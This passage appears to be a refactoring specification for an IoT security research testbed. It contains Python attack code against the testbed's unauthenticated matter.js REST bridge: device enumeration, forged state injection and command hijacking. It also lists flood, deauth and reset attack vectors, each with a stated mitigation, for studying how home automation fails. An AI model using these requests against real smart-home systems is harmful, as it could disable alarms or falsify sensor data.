`generate_task_from_llm()`, `start_task()`, `complete_current_task()`,
`update_agent_position()`, `update_humanoid()`, `interact_with_device()`,
`render()`, all properties, `get_recent_events()`, `get_automation_rules()`, `stats`.

**Result**: ~700 lines (down from 822). The bulk of the saving comes from deleting
`_init_matter_bridge()` and simplifying `init_iot()`. The class is still the
scene-specific coordinator but no longer owns shared infrastructure.

### 3.11 `vesper/habitat/wifi_firmware_bridge.py` — MatterFirmwareBridge (MODIFY)

**Purpose**: Bridges Habitat EventBus sensor events → WiFiEmulator → matter.js bridge REST API.

**Current state**: Already correctly routes through `WiFiEmulator.route_to_bridge()` when
a `wifi_emulator` is injected. The `_send_state_update()` method already has the WiFi-first
path with fallback to direct `MatterBridgeClient`. **This file is mostly correct.**

**Required change**: Add an optional `hub` parameter so the bridge can optionally route
through the VirtualHub (for traffic logging at the hub layer). Everything else stays.

**Exact edits**:

1. **Add `hub` parameter to `__init__`**:
```python
# BEFORE:
def __init__(
    self,
    event_bus: EventBus,
    config: Optional[BridgeConfig] = None,
    device_map: Optional[List[DeviceMapping]] = None,
    wifi_emulator: Optional[Any] = None,
):
    # ...
    self._wifi: Optional[Any] = wifi_emulator
    self._bridge: Optional[MatterBridgeClient] = None

# AFTER:
def __init__(
    self,
    event_bus: EventBus,
    config: Optional[BridgeConfig] = None,
    device_map: Optional[List[DeviceMapping]] = None,
    wifi_emulator: Optional[Any] = None,
    hub: Optional[Any] = None,         # NEW — injected VirtualHub
    registry: Optional[Any] = None,    # NEW — injected DeviceRegistry
):
    # ...
    self._wifi: Optional[Any] = wifi_emulator
    self._hub: Optional[Any] = hub         # NEW
    self._registry: Optional[Any] = registry  # NEW
    self._bridge: Optional[MatterBridgeClient] = None
```

2. **Keep `_send_state_update()` exactly as-is** — it already does WiFi-first routing.
   Only add registry fallback at the very end:
```python
# At the bottom of _send_state_update(), after the existing fallback block:
    # Last resort: update registry directly so state is not lost
    if self._registry:
        self._registry.update_state(mapping.matter_device_id, {"state": state})
```

3. **Keep everything else unchanged** (BridgeConfig, DeviceMapping, DEFAULT_DEVICE_MAP,
   all event handlers, `_connect_matter_bridge()`, public API).

### 3.12 `vesper/attacks/` — Attack Framework (MODIFY)

#### `wifi_attacks.py` — WiFiAttackFramework (KEEP, works correctly)
**Tools**: WiFiEmulator (for Mininet-WiFi namespace access), scapy, subprocess

#### `network_attacks.py` — NetworkAttackFramework (REWRITE)
**Problem**: Has 5 attack suites that use fake TCP broker protocol (SUB/PUB/CMD over raw sockets). The actual architecture uses a REST API bridge on port 8484. The TCP-based attack methods will fail against the real system.

**New approach**: Rewrite each suite to target the actual attack surfaces:
- **MatterAttackSuite**: HTTP requests to REST API at `:8484` (not raw TCP sockets)
- **TCPAttackSuite**: Keep TCP flood/MITM but target the bridge's HTTP port, not a fake broker
- **ProtocolAttackSuite**: Keep Zigbee/Z-Wave simulation attacks (these are protocol-level)
- **NetworkInfraAttackSuite**: Keep ARP/DNS/deauth (infrastructure-level, correct as-is)
- **TrafficAnalysisSuite**: Change from analyzing fake broker traffic to sniffing HTTP between WiFi stations and bridge

**Step 1 — Add `import requests`** at the top of the file (after `import threading`):
```python
import requests  # ADD — HTTP REST API attacks
```

**Step 2 — Update `NetworkTarget` dataclass** to add two new fields and remove legacy broker fields:
```python
# BEFORE:
@dataclass
class NetworkTarget:
    matter_bridge_url: str = "http://127.0.0.1:8484"
    broker_host: str = "127.0.0.1"
    broker_port: int = 8484
    devices: List[Tuple[str, int]] = field(default_factory=list)
    gateway_ip: str = "172.20.0.1"
    subnet: str = "172.20.0.0/24"

# AFTER:
@dataclass
class NetworkTarget:
    matter_bridge_url: str = "http://127.0.0.1:8484"
    devices: List[Tuple[str, int]] = field(default_factory=list)  # (host, port) for TCP attacks
    gateway_ip: str = "172.20.0.1"
    subnet: str = "172.20.0.0/24"
    wifi_emulator: Any = None  # NEW — for traffic analysis via WiFiEmulator logs
    hub: Any = None            # NEW — for hub-level attack routing
    # Keep broker_host/port as properties for backward compat:
    @property
    def broker_host(self):
        return self.matter_bridge_url.split("//")[1].split(":")[0]
    @property
    def broker_port(self):
        try: return int(self.matter_bridge_url.split(":")[-1].rstrip("/"))
        except ValueError: return 8484
```

**Step 3 — Rewrite `MatterAttackSuite` class** — replace entire class body:
```python
class MatterAttackSuite:
    """
    Matter protocol attack suite targeting the REST API bridge at :8484.
    """

    def __init__(self):
        self.captured_messages: List[Dict] = []

    # ─── Attack: Unauthorized Device Enumeration ──────────────────

    def attack_unauthorized_subscribe(self, target: NetworkTarget) -> NetworkAttackResult:
        """Enumerate all devices from the REST API without authentication."""
        evidence = []
        captured = []
        try:
            resp = requests.get(
                f"{target.matter_bridge_url}/api/devices",
                timeout=5,
            )
            evidence.append(f"GET /api/devices → HTTP {resp.status_code}")
            if resp.status_code == 200:
                devices = resp.json()
                for d in devices:
                    captured.append(d)
                    evidence.append(
                        f"  Device: {d.get('id','?')} type={d.get('type','?')} "
                        f"room={d.get('room','?')}"
                    )
                evidence.append(f"Leaked {len(devices)} devices without authentication")
            else:
                evidence.append(f"Enumeration blocked: {resp.text[:100]}")
        except requests.exceptions.ConnectionError:
            evidence.append(f"Bridge unreachable at {target.matter_bridge_url}")
        except Exception as e:
            evidence.append(f"Error: {e}")

        success = len(captured) > 0
        return NetworkAttackResult(
            attack_name="Unauthorized Device Enumeration",
            category=NetworkAttackCategory.MATTER_SNIFF,
            success=success,
            description="Enumerate all IoT devices from REST API without credentials",
            evidence=evidence,
            impact="Full device inventory disclosure, vulnerability targeting",
            mitigation="Require API key / Bearer token on all REST endpoints",
            intercepted_data=captured,
            packets_captured=len(captured),
        )

    # ─── Attack: State Injection ───────────────────────────────────

    def attack_matter_message_injection(self, target: NetworkTarget) -> NetworkAttackResult:
        """Inject forged state into devices via unauthenticated PUT requests."""
        evidence = []
        injected = []

        # First enumerate devices to get real IDs
        device_ids = []
        try:
            r = requests.get(f"{target.matter_bridge_url}/api/devices", timeout=5)
            if r.status_code == 200:
                device_ids = [d["id"] for d in r.json()]
        except Exception:
            device_ids = ["kitchen-light-01", "motion-sensor-01", "smart-plug-01"]

        fake_payloads = [
            {"power": "on", "brightness": 100, "_forged": True},
            {"motion": True, "occupancy": True, "_forged": True},
            {"temperature": 99.9, "_forged": True},
        ]

        for device_id, payload in zip(device_ids[:3], fake_payloads):
            try:
                resp = requests.put(
                    f"{target.matter_bridge_url}/devices/{device_id}/state",
                    json=payload,
                    timeout=5,
                )
                injected.append({"device_id": device_id, "payload": payload})
                evidence.append(
                    f"PUT /devices/{device_id}/state → {resp.status_code}: "
                    f"{resp.text[:80]}"
                )
            except Exception as e:
                evidence.append(f"Injection failed for {device_id}: {e}")

        success = any("200" in e or "201" in e or "204" in e for e in evidence)
        return NetworkAttackResult(
            attack_name="Matter State Injection",
            category=NetworkAttackCategory.MATTER_INJECTION,
            success=success,
            description="Inject forged device states via unauthenticated PUT requests",
            evidence=evidence,
            impact="False sensor data triggers incorrect automations",
            mitigation="Authenticate all REST write endpoints (HMAC, Bearer token)",
            intercepted_data=injected,
            packets_sent=len(injected),
        )

    # ─── Attack: Command Hijack ────────────────────────────────────

    def attack_matter_command_hijack(self, target: NetworkTarget) -> NetworkAttackResult:
        """Send unauthorized commands to devices via the REST API."""
        evidence = []
        hijacked = []

        # Enumerate to get device IDs
        device_ids = []
        try:
            r = requests.get(f"{target.matter_bridge_url}/api/devices", timeout=5)
            if r.status_code == 200:
                device_ids = [d["id"] for d in r.json()]
        except Exception:
            device_ids = ["kitchen-light-01", "smart-plug-01"]

        attacker_cmds = [
            {"command": "setLevel", "level": 0},    # dim to 0 (effectively OFF)
            {"command": "toggleOnOff"},
        ]

        for device_id, cmd in zip(device_ids[:2], attacker_cmds):
            try:
                resp = requests.post(
                    f"{target.matter_bridge_url}/devices/{device_id}/command",
                    json=cmd,
                    timeout=5,
                )
                hijacked.append({"device_id": device_id, "command": cmd})
                evidence.append(
                    f"POST /devices/{device_id}/command → {resp.status_code}: "
                    f"{resp.text[:80]}"
                )
            except Exception as e:
                evidence.append(f"Command failed for {device_id}: {e}")

        success = any("200" in e or "202" in e for e in evidence)
        return NetworkAttackResult(
            attack_name="Matter Command Hijack",
            category=NetworkAttackCategory.MATTER_HIJACK,
            success=success,
            description="Send unauthorized control commands via unauthenticated REST API",
            evidence=evidence,
            impact="Attacker can turn off security devices, manipulate environment",
            mitigation="Require command authentication, implement Matter ACL fabric",
            intercepted_data=hijacked,
        )
```

**Step 4 — Update `TCPAttackSuite`**: Change `attack_tcp_flood` and `attack_tcp_mitm_proxy` to
also target the bridge HTTP port when no QEMU devices are available:
```python
# In attack_tcp_flood() and attack_tcp_connection_hijack(), add at start:
    if not target.devices:
        # Fall back to targeting the REST bridge port
        host = target.broker_host
        port = int(target.matter_bridge_url.split(':')[-1].rstrip('/')) if ':' in target.matter_bridge_url else 8484
```

**Step 5 — Update `TrafficAnalysisSuite.attack_traffic_fingerprint()`** to use WiFiEmulator:
```python
# ADD WiFiEmulator-based traffic analysis path:
    if target.wifi_emulator:
        try:
            records = target.wifi_emulator.traffic_tracker.get_recent(100)
            for rec in records:
                # Analyze timing patterns, payload sizes, endpoint paths
                fingerprints.append({
                    "device_id": rec.device_id,
                    "path": getattr(rec, 'path', ''),
                    "size": getattr(rec, 'payload_size', 0),
                    "timestamp": rec.timestamp,
                })
            evidence.append(f"Captured {len(records)} WiFi traffic records via emulator")
        except Exception as e:
            evidence.append(f"WiFi traffic capture error: {e}")
```

**Keep unchanged**: `ProtocolAttackSuite` (Zigbee/Z-Wave simulation), `NetworkInfraAttackSuite` (ARP/DNS/deauth), `NetworkAttackFramework.run_all_attacks()` and `print_report()`.

#### `phantom_delay_attack.py` — PhantomDelayAttackSuite (KEEP, works correctly)
**Tools**: stdlib sockets (TCP proxy), threading

#### `firmware_attacks.py` — FirmwareAttackFramework (KEEP, works correctly)  
**Tools**: ESP32Runner (QEMU serial TCP ports)

### 3.13 `vesper/simulation/` — Simulation Package (KEEP, minor)

**Purpose**: Time management, task system, task generator, event stream, autonomous simulation.

**Change**: Remove the `importlib` hack in `__init__.py`. The hack loads `vesper/simulation.py` by file path to work around the package/file name collision. Since `simulation.py` is being deleted (replaced by `engine.py`), the hack is no longer needed.

**Exact edits**:

1. **Delete the entire importlib hack block** (approximately lines 53-68 of the current file):
```python
# DELETE all of this:
import importlib.util as _ilu
import pathlib as _pl

_sim_file = _pl.Path(__file__).resolve().parent.parent / "simulation.py"
_spec = _ilu.spec_from_file_location("vesper._sim_runner", str(_sim_file))
_sim_mod = _ilu.module_from_spec(_spec)  # type: ignore[arg-type]
import sys as _sys
_sys.modules["vesper._sim_runner"] = _sim_mod
_spec.loader.exec_module(_sim_mod)  # type: ignore[union-attr]

Simulation = _sim_mod.Simulation
SimulationStats = _sim_mod.SimulationStats
```

2. **Replace with clean imports** from the new engine module:
```python
# ADD (replaces the deleted block):
from vesper.engine import VesperEngine as Simulation, EngineStats as SimulationStats
```

3. **Keep `__all__` list unchanged** — `Simulation` and `SimulationStats` are still exported for backward compat.

4. **Keep all other imports unchanged** (TimeManager, Task, TaskGenerator, etc.).

### 3.14 `vesper/__main__.py` — CLI (MODIFY)

**Change**: Replace `from vesper.simulation import Simulation` with `from vesper.engine import VesperEngine` in all three runner functions.

**Exact edits**:

1. **In `run_simulation()`** (line ~29):
```python
# BEFORE:
    from vesper.simulation import Simulation
    # ...
    with Simulation(config_path=config_path) as sim:

# AFTER:
    from vesper.engine import VesperEngine
    # ...
    with VesperEngine(config_path=config_path) as engine:
        # Then rename all `sim.` → `engine.` within the with-block:
        #   sim.event_bus → engine.event_bus
        #   sim.simulator → engine.simulator
        #   sim.agent_controller → engine.agent_controller
        #   sim.environment → engine.environment
        #   sim.stats → engine.stats
        #   sim.run() → engine.run()
```

2. **In `run_demo()`** (line ~137):
```python
# BEFORE:
    from vesper.simulation import Simulation
    with Simulation() as sim:

# AFTER:
    from vesper.engine import VesperEngine
    with VesperEngine() as engine:
        # Rename all `sim.` → `engine.` within the with-block
```

3. **In `run_platform()`** — no change needed (already uses `VesperPlatform`).

4. **Keep everything else unchanged**: argument parser, `main()`, `setup_logging()`.

### 3.15 `vesper/platform.py` — VesperPlatform (MODIFY)

**Change**: Accept an optional `VesperEngine` instance. When provided, share its EventBus instead of creating a new one.

**Exact edits**:

1. **Add `engine` parameter to constructor**:
```python
# BEFORE:
def __init__(self, config: Config):
    self.config = config
    self._event_bus = None

# AFTER:
def __init__(self, config: Config, engine=None):
    self.config = config
    self._engine = engine
    self._event_bus = engine.event_bus if engine else None
```

2. **In `start()`** — skip EventBus creation if already injected. Note: EventBus is synchronous/pull-only (Section 3.2.1) — it has no `start()` method and no background thread. Remove any `self._event_bus.start()` call:
```python
# BEFORE:
    from vesper.core.event_bus import EventBus
    self._event_bus = EventBus(max_queue_size=self.config.event_bus.max_queue_size)
    self._event_bus.start()   # ← WRONG: EventBus has no start()

# AFTER:
    if self._event_bus is None:
        from vesper.core.event_bus import EventBus
        self._event_bus = EventBus(max_queue_size=self.config.event_bus.max_queue_size)
    else:
        logger.info("✓ EventBus shared from VesperEngine")
    # No start() call — EventBus is pull-only via process_events()
```

3. **In `stop()`** — remove `event_bus.stop()` call (EventBus is pull-only, no background thread to stop). Only clean up if we created it:
```python
# BEFORE:
    if self._event_bus:
        self._event_bus.stop()   # ← WRONG: EventBus has no stop()

# AFTER:
    if self._event_bus and not self._engine:
        self._event_bus = None   # release reference; no stop() needed
```

**Keep everything else unchanged**: Hub, Matter, Dashboard startup logic.

### 3.16 Files to DELETE (dead code)

| File | Reason |
|------|--------|
| `vesper/simulation.py` | Replaced by `vesper/engine.py` — eliminates file/package collision |
| `vesper/protocol/__init__.py` | Never imported by any module |
| `vesper/protocol/codec.py` | Never imported by any module |
| `vesper/protocol/handler.py` | Never imported by any module |
| `vesper/protocol/messages.py` | Never imported by any module |
| `vesper/network/transport.py` | Never imported by main data flow (dead abstraction) |
| `vesper/network/router.py` | Never imported by main data flow (dead abstraction) |
| `vesper/network/broker.py` | Never imported by main data flow (dead abstraction) |

### 3.17 `vesper/network/__init__.py` — (MODIFY)

Remove imports of deleted files (`transport`, `router`, `broker`). Export `WiFiTrafficRecord` (renamed).

```python
# vesper/network/__init__.py — UPDATED
from vesper.network.wifi_emulator import (
    WiFiEmulator,
    WiFiConfig,
    DeviceConfig,
    DeviceType,
    TrafficTracker,
    WiFiTrafficRecord,   # RENAMED from TrafficRecord
    WIFI_AVAILABLE,
)

try:
    from vesper.matter.bridge_client import MatterBridgeClient
    MATTER_BRIDGE_AVAILABLE = True
except ImportError:
    MATTER_BRIDGE_AVAILABLE = False
    MatterBridgeClient = None
```

### 3.18 `vesper/__init__.py` — Package root (MODIFY)

```python
__version__ = "3.0.0"   # bump for redesign

from vesper.config import Config, load_config
from vesper.engine import VesperEngine

__all__ = ["__version__", "Config", "load_config", "VesperEngine"]
```

### 3.19 `vesper/core/__init__.py` — (MODIFY)

```python
from vesper.core.event_bus import EventBus, Event
from vesper.core.environment import Environment
from vesper.core.registry import DeviceRegistry, DeviceEntry

__all__ = ["EventBus", "Event", "Environment", "DeviceRegistry", "DeviceEntry"]
```

---

## 4. Data Flow Diagrams

### 4.1 Sensor Event: Habitat 3D → WiFi → Matter → Home Assistant

```
Step 1: 3D World
  HumanoidController walks → PIR raycast detects motion
  → SensorBridge._on_3d_motion_detected()
  → EventBus.publish("motion_detected", {room, device_id, occupancy: true})

Step 2: MatterFirmwareBridge (subscribed to EventBus)
  → receives "motion_detected"
  → calls Hub.set_device_state("motion-sensor-01", {occupancy: true})

Step 3: VirtualHub.set_device_state()
  → logs HubTrafficRecord (protocol=matter, direction=outbound)
  → calls WiFiNetwork.route_to_bridge("motion-sensor-01", "PUT",
         "/devices/motion-sensor-01/state", {occupancy: true})

Step 4: WiFiEmulator.route_to_bridge()
  → Docker mode: ip netns exec sta4 curl -X PUT ... → 802.11 → AP → bridge
  → Sim mode: sleep(latency) → requests.put(bridge_url/...)
  → logs WiFiTrafficRecord
  → returns {status: 200, latency_ms: 3.5}

Step 5: matter.js bridge (Docker, :8484)
  → receives PUT /devices/motion-sensor-01/state
  → updates OccupancySensorDevice cluster attributes
  → Matter fabric subscription report → python-matter-server

Step 6: python-matter-server → Home Assistant
  → HA entity binary_sensor.motion_sensor_01 → "on"
  → HA automations fire

Step 7: (Return path) VirtualHub._ha_event_listener()
  → receives HA state_changed WebSocket event
  → DeviceRegistry.update_state("motion-sensor-01", {ha_state: "on"})
  → EventBus.publish("device.state_changed", {...})
```

### 4.2 Attack Injection: WiFi Deauth

```
Step 1: Evaluator schedules attack
  → WiFiAttackFramework.attack_deauth(target_station="sta1")

Step 2: WiFiAttackFramework
  → scapy Dot11Deauth inside Mininet-WiFi router namespace
  → tshark captures deauth frames in pcap

Step 3: Station sta1 (kitchen-light-01) disconnects from AP
  → All HTTP traffic from that station fails
  → WiFiEmulator.route_to_bridge() returns {success: false}
  → Hub logs HubTrafficRecord with error
  → DeviceRegistry.set_online("kitchen-light-01", false)

Step 4: Evaluator measures
  → Time to detect offline device
  → Automation disruption (TAP rules fail)
  → Recovery time after attack stops
```

### 4.3 Attack Injection: REST API State Injection

```
Step 1: Evaluator schedules attack
  → NetworkAttackFramework.attack_unauthorized_state_injection(
        "motion-sensor-01", {occupancy: false})

Step 2: NetworkAttackFramework
  → HTTP PUT to matter.js bridge: /devices/motion-sensor-01/state
  → Bridge accepts (no auth by default!)
  → Matter attribute changes → HA sees false "no motion"

Step 3: Evaluator measures
  → TAP rules evaluate incorrect state
  → Phantom occupancy: lights stay off when someone is home
  → Security: alarm system fails to trigger
```

---

## 5. File-Level Change Plan

### 5.1 New files to CREATE

| File | Lines (est.) | Description |
|------|-------------|-------------|
| `vesper/engine.py` | ~250 | VesperEngine — main orchestrator |
| `vesper/core/registry.py` | ~200 | DeviceRegistry — canonical device store |

### 5.2 Files to MODIFY

| File | Key Changes |
|------|-------------|
| `vesper/config.py` | Add NetworkConfig, FirmwareConfig, wire to root Config |
| `vesper/__init__.py` | Export VesperEngine, bump version to 3.0.0 |
| `vesper/__main__.py` | Use VesperEngine instead of Simulation |
| `vesper/core/__init__.py` | Export DeviceRegistry, DeviceEntry |
| `vesper/core/environment.py` | Accept DeviceRegistry, delegate device storage |
| `vesper/network/wifi_emulator.py` | Rename TrafficRecord → WiFiTrafficRecord, accept registry, remove MQTT aliases |
| `vesper/network/__init__.py` | Remove dead imports (transport/router/broker), export WiFiTrafficRecord |
| `vesper/hub/base.py` | Rename TrafficRecord → HubTrafficRecord |
| `vesper/hub/virtual_hub.py` | Accept injected deps (registry, wifi, matter_bridge), use HubTrafficRecord, route through WiFi |
| `vesper/hub/manager.py` | Pass injected deps through to VirtualHub |
| `vesper/habitat/vesper_integration.py` | Slim down: accept injected EventBus/Registry/MatterBridge, remove self-creation |
| `vesper/habitat/wifi_firmware_bridge.py` | Add `hub` + `registry` params; append registry fallback in `_send_state_update()` |
| `vesper/simulation/__init__.py` | Remove importlib hack, add backward-compat alias from engine.py |
| `vesper/platform.py` | Use shared EventBus/Registry |
| `vesper/attacks/network_attacks.py` | Rewrite: target REST API instead of fake broker protocol |

### 5.3 Files to DELETE

| File | Reason |
|------|--------|
| `vesper/simulation.py` | Replaced by engine.py (eliminates file/package collision) |
| `vesper/protocol/__init__.py` | Dead code — never imported |
| `vesper/protocol/codec.py` | Dead code — never imported |
| `vesper/protocol/handler.py` | Dead code — never imported |
| `vesper/protocol/messages.py` | Dead code — never imported |
| `vesper/network/transport.py` | Dead code — never used in data flow |
| `vesper/network/router.py` | Dead code — never used in data flow |
| `vesper/network/broker.py` | Dead code — never used in data flow |

### 5.4 Files UNCHANGED (no modifications needed)

| File | Why unchanged |
|------|---------------|
| `vesper/core/event_bus.py` | Core logic unchanged; minimal singleton guard added |
| `vesper/matter/bridge_client.py` | Already fine, just needs to be created once |
| `vesper/matter/client.py` | python-matter-server WS client — independent |
| `vesper/matter/adapter.py` | MatterAdapter — independent |
| `vesper/matter/device.py` | Data model — independent |
| `vesper/matter/const.py` | Constants — independent |
| `vesper/attacks/wifi_attacks.py` | Works correctly with WiFiEmulator |
| `vesper/attacks/phantom_delay_attack.py` | TCP proxy — works correctly |
| `vesper/attacks/firmware_attacks.py` | ESP32 QEMU — works correctly |
| `vesper/automation/tap_engine.py` | TAP rules — works correctly (1935 lines) |
| `vesper/agents/*` | Agent system — works correctly |
| `vesper/devices/*` | Device models — works correctly |
| `vesper/evaluation/*` | Evaluation — works correctly |
| `vesper/firmware/*` | Firmware — works correctly |
| `vesper/habitat/simulator.py` | HabitatSimulator — works correctly |
| `vesper/habitat/sensor_bridge.py` | SensorBridge — works correctly |
| `vesper/habitat/humanoid.py` | HumanoidController — works correctly |
| `vesper/habitat/iot_bridge.py` | IoTBridge — works correctly |
| `vesper/habitat/iot_overlay.py` | IoTDeviceManager — works correctly |
| `vesper/dashboard/app.py` | Dashboard — works correctly |
| `vesper/integrations/*` | SmartThings etc — independent |

---

## 6. Docker / External Services

No changes to Docker architecture. The redesign only affects the Python host-side code.

### 6.1 Docker services (unchanged)

| Service | Image | Port | Purpose |
|---------|-------|------|---------|
| `vesper-router` | Dockerfile.router | host network | Mininet-WiFi AP + dnsmasq + NAT |
| `vesper-dev-*` (×8) | Dockerfile.esp32 | via router | ESP32 QEMU IoT devices |
| `vesper-homeassistant` | HA stable | 8123 | Device control + Matter fabric |
| `vesper-matter-server` | python-matter-server | 5580 | Matter controller (WebSocket) |
| `vesper-matter-bridge` | matter-bridge/Dockerfile | 8484, 5540 | matter.js REST → Matter endpoints |

### 6.2 Minor Docker cleanup

| File | Change |
|------|--------|
| `docker/Dockerfile.router` | Remove `mosquitto mosquitto-clients` from apt-get, remove `paho-mqtt` from pip install |

---

## 7. Config Schema

The YAML config (`configs/default.yaml`) remains the same — the change is on the Python side where `NetworkConfig` and `FirmwareConfig` are now parsed.

Current YAML sections and their Pydantic models:

| YAML Section | Pydantic Model | Status |
|---|---|---|
| `simulation:` | `SimulationConfig` | ✅ Exists |
| `environment:` | `EnvironmentConfig` | ✅ Exists |
| `devices:` | `DevicesConfig` | ✅ Exists |
| `event_bus:` | `EventBusConfig` | ✅ Exists |
| `logging:` | `LoggingConfig` | ✅ Exists |
| `hub:` | `HubConfig` | ✅ Exists |
| `matter:` | `MatterConfig` | ✅ Exists |
| `dashboard:` | `DashboardConfig` | ✅ Exists |
| `network:` | `NetworkConfig` | ❌ **NEW — must add** |
| `firmware:` | `FirmwareConfig` | ❌ **NEW — must add** |

---

## 7A. Verified External API Contracts

> These contracts are verified from the actual source files. Claude Code MUST use exactly these endpoints, methods, status codes, and payload shapes. Do NOT invent endpoints that don't exist.

### 7A.1 matter.js Bridge REST API (verified from `docker/matter-bridge/bridge.mjs`)

**Base URL**: `http://localhost:8484` (configurable via `BRIDGE_API_PORT` env var)
**Authentication**: **NONE** — all endpoints are unauthenticated (this IS the attack surface)

| Method | Path | Request Body | Success Response | Error Responses |
|--------|------|-------------|-----------------|-----------------|
| `GET` | `/health` | — | `200 { status: "ok", devices: N, matterPort: 5540, commissioned: bool }` | — |
| `GET` | `/devices` | — | `200 [{ id, type, name, room, state }]` | — |
| `POST` | `/devices` | `{ id: string, type: string, name?: string, room?: string, state?: object }` | `201 { id, type, name, room, state }` | `400 { error: "id and type are required" }`, `409 { error: "Device ... already exists" }`, `500 { error }` |
| `PUT` | `/devices/:id/state` | State object (see below) | `200 { id, state }` | `404 { error: "Device ... not found" }`, `500 { error }` |
| `DELETE` | `/devices/:id` | — | `204` (no body) | `404 { error: "Device ... not found" }`, `500 { error }` |
| `GET` | `/pairing` | — | `200 { passcode, discriminator, manualCode }` | `503 { error: "Bridge not started yet" }` |
| `POST` | `/devices/bulk` | `[{ id, type, name?, room?, state? }]` | `201 [{ id, status: "created" } \| { id, error }]` | `500 { error }` |
| `POST` | `/reset` | — | `200 { status: "ok", devices: 0 }` | `500 { error }` |

**Supported device types** (string values accepted in `type` field):

| Type string | Matter device class | Supported state fields |
|-------------|--------------------|-----------------------|
| `smart_light` or `light` | `OnOffLightDevice` | `power` ("on"/"off") |
| `smart_plug` or `plug` | `OnOffPlugInUnitDevice` | `power` ("on"/"off") |
| `temperature_sensor` | `TemperatureSensorDevice` | `temperature` (°C × 100, integer) |
| `humidity_sensor` | `HumiditySensorDevice` | `humidity` (% × 100, integer) |
| `contact_sensor` or `door_sensor` | `ContactSensorDevice` | `contact` (bool), `open` (bool) |
| `motion_sensor` | `OccupancySensorDevice` | `motion` (bool), `occupancy` (bool) |

**PUT state update behavior**: The bridge uses `switch(info.type)` to map state fields to Matter cluster attributes:
- `power` → `OnOff.onOff` cluster: `endpoint.set({ onOff: { onOff: power === "on" } })`
- `temperature` → `TemperatureMeasurement.measuredValue`: integer, centidegrees
- `humidity` → `RelativeHumidityMeasurement.measuredValue`: integer, centipercent
- `contact`/`open` → `BooleanState.stateValue`
- `motion`/`occupancy` → `OccupancySensing.occupancy.occupied` (bitmap)

State fields not matching the device type's switch case are **silently merged** into `info.state` but NOT propagated to the Matter fabric. This is important: arbitrary JSON keys can be stored, but only the above fields affect Matter.

**Event subscriptions**: For lights and plugs, the bridge registers `onOff$Changed` listeners that update `info.state.power` when the Matter fabric changes state externally (e.g., from Home Assistant). No equivalent callback exists for sensors (sensors are push-only from the REST API side).

### 7A.2 Home Assistant REST/WebSocket API

| Method | Path | Purpose | Used by |
|--------|------|---------|---------|
| `GET` | `/api/` | Health check | `VirtualHub._check_ha_connection()` |
| `GET` | `/api/states` | All entity states | `VirtualHub._sync_ha_states()` |
| `GET` | `/api/states/:entity_id` | Single entity state | `VirtualHub.get_device_state()` |
| `POST` | `/api/services/:domain/:service` | Call HA service (e.g., light.turn_on) | `VirtualHub.send_command()` |
| `WS` | `/api/websocket` | Real-time event stream | `VirtualHub._ha_event_listener()` |

**Auth**: `Authorization: Bearer <LONG_LIVED_ACCESS_TOKEN>` header on all requests.

### 7A.3 python-matter-server WebSocket API

| URL | Purpose | Used by |
|-----|---------|---------|
| `ws://localhost:5580/ws` | Matter fabric control | `vesper/matter/client.py` |

**Auth**: None (local only, Docker network isolation).

### 7A.4 Attack Surface Summary (derived from API contracts)

| Attack vector | Target | Why it works |
|---------------|--------|-------------|
| **Device enumeration** | `GET /devices` | No auth → full inventory disclosure |
| **State injection** | `PUT /devices/:id/state` | No auth → forge any sensor reading |
| **Device creation** | `POST /devices` | No auth → phantom devices in Matter fabric |
| **Device deletion** | `DELETE /devices/:id` | No auth → DoS by removing all devices |
| **Bulk injection** | `POST /devices/bulk` | No auth → mass phantom device attack |
| **Factory reset** | `POST /reset` | No auth → delete all devices at once |

These attack vectors are the basis for `NetworkAttackFramework.MatterAttackSuite` (Section 3.12).

---

## 8. Implementation Order

Execute in this exact order to avoid import errors:

```
Phase 1: Foundation (no breaking changes)
  1. Add NetworkConfig + FirmwareConfig to vesper/config.py
  2. Create vesper/core/registry.py (DeviceRegistry)
  3. Update vesper/core/__init__.py to export registry
  4. Verify: python -c "from vesper.core.registry import DeviceRegistry; print('OK')"

Phase 2: New engine (additive)
  5. Create vesper/engine.py (VesperEngine)
  6. Update vesper/__init__.py to export VesperEngine
  7. Verify: python -c "from vesper.engine import VesperEngine; print('OK')"

Phase 3: Rename TrafficRecords (safe rename)
  8. Rename TrafficRecord → WiFiTrafficRecord in vesper/network/wifi_emulator.py
  9. Update vesper/network/__init__.py (export WiFiTrafficRecord, remove dead imports)
  10. Rename TrafficRecord → HubTrafficRecord in vesper/hub/base.py
  11. Update vesper/hub/virtual_hub.py to use HubTrafficRecord
  12. Verify: python -c "from vesper.network import WiFiTrafficRecord; print('OK')"

Phase 4: Wire Hub through WiFi (the critical architecture fix)
  13. Modify VirtualHub constructor: accept injected deps
  14. Modify VirtualHub._publish_matter(): route through WiFiNetwork
  15. Modify HubManager: pass deps through
  16. Verify Hub creation with injected deps

Phase 5: Fix Environment to use DeviceRegistry
  17. Modify vesper/core/environment.py: accept registry, delegate device storage
  18. Verify: python -c "from vesper.core import Environment, DeviceRegistry; ..."

Phase 6: Slim down VesperIntegration
  19. Modify vesper/habitat/vesper_integration.py: accept injected deps
  20. Modify vesper/habitat/wifi_firmware_bridge.py: route through Hub

Phase 7: Eliminate simulation.py collision
  21. Delete vesper/simulation.py
  22. Update vesper/simulation/__init__.py: remove importlib hack, alias from engine
  23. Update vesper/__main__.py: use VesperEngine
  24. Update vesper/platform.py: use shared deps

Phase 8: Clean up dead code
  25. Delete vesper/protocol/ directory
  26. Delete vesper/network/transport.py, router.py, broker.py
  27. Remove MQTT aliases from wifi_emulator.py
  28. Remove mosquitto from docker/Dockerfile.router

Phase 9: Rewrite network attacks
  29. Rewrite vesper/attacks/network_attacks.py: REST API attacks
  30. Update vesper/attacks/__init__.py

Phase 10: Final verification
  31. Run: python -c "from vesper.engine import VesperEngine; e = VesperEngine(); e.initialize(); print('OK')"
  32. Run: python -m vesper --demo
  33. Run test suite: pytest tests/
```

---

## 9. Constraints & Non-Goals

### 9.1 Constraints

- **Python 3.9+** (conda env `vesper`)
- **macOS development** (Docker Desktop, no Mininet-WiFi natively → sim mode)
- **Linux deployment** (Docker with --privileged, mac80211_hwsim)
- **Backward compat**: Existing scripts in `scripts/` should still work with minimal changes (the `Simulation` alias in `simulation/__init__.py` handles this)
- **No new external dependencies** — use only what's in requirements.txt

### 9.2 Non-Goals (out of scope for this redesign)

- Rewriting the 3D simulation (Habitat-Sim integration is fine)
- Rewriting the agent system (agents/ is fine)
- Rewriting the evaluation framework (evaluation/ is fine)
- Rewriting the TAP engine (automation/ is fine, 1935 lines)
- Rewriting the dashboard (dashboard/ is fine)
